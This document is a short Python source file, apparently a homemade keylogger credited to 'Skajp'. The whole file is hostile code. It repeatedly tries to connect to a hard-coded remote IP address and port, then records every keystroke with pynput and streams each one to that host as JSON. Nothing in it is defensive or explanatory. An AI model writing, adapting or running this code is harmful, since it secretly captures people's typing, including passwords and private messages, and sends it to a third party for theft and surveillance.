

# Made by Skajp
from pynput.keyboard import Key, Listener
import logging, socket, json

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
notcon = True
while notcon:
    try:
        s.connect((str('159.223.171.199'), int(36312)))
        notcon = False
        break
    except:
        pass

def rs(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def on_press(key):
    rs(str(key))

with Listener(on_press=on_press) as listener :
    listener.join()
        